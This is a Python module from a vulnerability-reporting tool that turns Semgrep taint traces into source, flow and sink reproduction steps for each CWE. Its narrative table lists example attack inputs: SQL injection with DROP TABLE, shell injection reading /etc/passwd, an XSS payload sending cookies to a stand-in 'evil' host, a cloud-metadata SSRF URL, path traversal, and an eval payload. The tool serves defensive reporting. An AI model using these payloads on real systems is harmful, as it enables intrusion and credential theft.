"""Steps-of-Reproduction builder (Phase 2E Task 1).

Turns Semgrep's taint-mode `dataflow_trace` into a structured, human-readable
"how is this exploitable" record: the SOURCE (where untrusted input enters), the
FLOW (variables the tainted value travels through), the SINK (the dangerous
operation), plus a per-CWE plain-English explanation and an example trigger input.

Everything positional (source/sink/flow file+line+code) is **extracted from
Semgrep's own dataflow trace** — never invented. When a finding has no taint
trace (secrets, quality, CVEs, pattern-only SAST rules), `build()` returns None
and the caller omits the section. See ACCURACY_VALIDATION.md / Phase 2E.
"""
from __future__ import annotations

import re

# Per-CWE narrative: (sink phrasing, why-exploitable, example trigger input).
# The wording is the standard, accurate explanation for the class — it annotates
# the *real* flow Semgrep found; it does not fabricate a flow.
_CWE_NARRATIVE: dict[str, dict[str, str]] = {
    "CWE-89": {
        "sink": "reaches a raw SQL query built by string concatenation",
        "why": "Because the value is concatenated into SQL instead of bound as a "
               "parameter, an attacker can inject SQL syntax to read, modify or "
               "delete arbitrary rows, bypass authentication, or exfiltrate the database.",
        "example": "1 OR 1=1 --   (or  1; DROP TABLE users --)",
    },
    "CWE-78": {
        "sink": "reaches an OS shell command",
        "why": "The tainted value is passed to a shell, so shell metacharacters let "
               "an attacker run arbitrary commands on the server with the app's privileges.",
        "example": "127.0.0.1; cat /etc/passwd   (or  $(id))",
    },
    "CWE-79": {
        "sink": "is written into an HTTP/HTML response without escaping",
        "why": "Unescaped attacker markup is reflected to victims' browsers and executes "
               "in their session — enabling cookie/session theft and actions as the victim.",
        "example": "<script>fetch('//evil?'+document.cookie)</script>",
    },
    "CWE-918": {
        "sink": "is used as the URL/host of a server-side request",
        "why": "An attacker who controls the destination can make the server reach "
               "internal-only services or the cloud metadata endpoint (169.254.169.254), "
               "exfiltrating credentials or pivoting into the internal network.",
        "example": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    },
    "CWE-22": {
        "sink": "is used to build a filesystem path",
        "why": "Without normalization, `../` sequences let an attacker escape the intended "
               "directory to read or overwrite arbitrary files (config, keys, source).",
        "example": "../../../../etc/passwd",
    },
    "CWE-94": {
        "sink": "is passed to a dynamic code evaluator (eval/exec)",
        "why": "The input is executed as program code, giving the attacker full "
               "application-level code execution.",
        "example": "__import__('os').system('id')",
    },
    "CWE-502": {
        "sink": "is deserialized without validation",
        "why": "A crafted serialized payload can instantiate gadget chains during "
               "deserialization and execute code.",
        "example": "a pickled/serialized object crafted to trigger a gadget chain",
    },
    "CWE-90": {
        "sink": "is concatenated into an LDAP filter",
        "why": "LDAP metacharacters let an attacker alter the filter to bypass "
               "authentication or enumerate directory entries.",
        "example": "*)(uid=*))(|(uid=*",
    },
    "CWE-943": {
        "sink": "reaches a NoSQL query",
        "why": "Operator injection (e.g. $ne/$gt) lets an attacker alter query logic to "
               "bypass authentication or read unintended documents.",
        "example": '{"$ne": null}',
    },
}

# Normalize CWE variants to the canonical class key above.
_CWE_ALIAS = {
    "CWE-95": "CWE-94",   # eval injection -> code injection
    "CWE-77": "CWE-78",   # command injection (generic) -> OS command injection
    "CWE-564": "CWE-89",  # SQL injection via ORM (Hibernate) -> SQLi
    "CWE-91": "CWE-943",  # XML/NoSQL injection variants
    "CWE-1336": "CWE-94", # template injection -> code injection
}

# Detect the kind of untrusted source from the source code string.
_SOURCE_KINDS: list[tuple[str, str]] = [
    (r"\.args|\.query|\.GET|querystring|getparameter", "an HTTP query-string parameter"),
    (r"\.form|\.POST|\.body|get_json|\.json|\.data\b", "the HTTP request body"),
    (r"\.headers|getheader", "an HTTP request header"),
    (r"\.cookies|getcookies", "an HTTP cookie"),
    (r"\.params\b|path_param|get_argument", "a URL path parameter"),
    (r"\breq(uest)?\b", "the HTTP request"),
]


def _loc_code(entry) -> dict | None:
    """Parse a Semgrep taint entry `["CliLoc", [loc, code]]` into {file,line,code}."""
    try:
        _, payload = entry
        loc, code = payload[0], payload[1]
        return {"file": loc.get("path", ""), "line": (loc.get("start") or {}).get("line"),
                "code": (code or "").strip()}
    except (TypeError, ValueError, IndexError, AttributeError):
        return None


def _source_kind(code: str) -> str:
    low = (code or "").lower()
    for pat, label in _SOURCE_KINDS:
        if re.search(pat, low):
            return label
    return "an untrusted external input"


def build(dataflow_trace: dict | None, cwe_id: str | None, rule_id: str) -> dict | None:
    """Build the structured steps-to-reproduce record, or None if the finding has
    no usable taint trace (→ the caller omits the section, never fabricates one)."""
    if not dataflow_trace:
        return None
    source = _loc_code(dataflow_trace.get("taint_source"))
    sink = _loc_code(dataflow_trace.get("taint_sink"))
    if not source or not sink or source.get("line") is None or sink.get("line") is None:
        return None

    flow = []
    for iv in dataflow_trace.get("intermediate_vars", []) or []:
        loc = iv.get("location") or {}
        flow.append({"file": loc.get("path", ""), "line": (loc.get("start") or {}).get("line"),
                     "code": (iv.get("content") or "").strip()})

    cwe_key = ""
    if cwe_id:
        m = re.search(r"CWE-\d+", cwe_id)
        cwe_key = m.group(0) if m else ""
    cwe_key = _CWE_ALIAS.get(cwe_key, cwe_key)
    narr = _CWE_NARRATIVE.get(cwe_key)

    source["label"] = f"Untrusted input enters here — {_source_kind(source['code'])}."
    if narr:
        sink["label"] = f"Tainted value {narr['sink']}."
        why = narr["why"]
        example = narr.get("example")
    else:
        sink["label"] = "Tainted value reaches a security-sensitive operation."
        why = ("Untrusted input reaches a sensitive operation without adequate "
               "sanitization along the highlighted path.")
        example = None

    steps = {
        "kind": "dataflow",
        "source": source,
        "flow": flow,          # ordered variables the tainted value passes through
        "sink": sink,
        "cwe": cwe_id,
        "why_exploitable": why,
    }
    if example:
        steps["example_input"] = example
    return steps
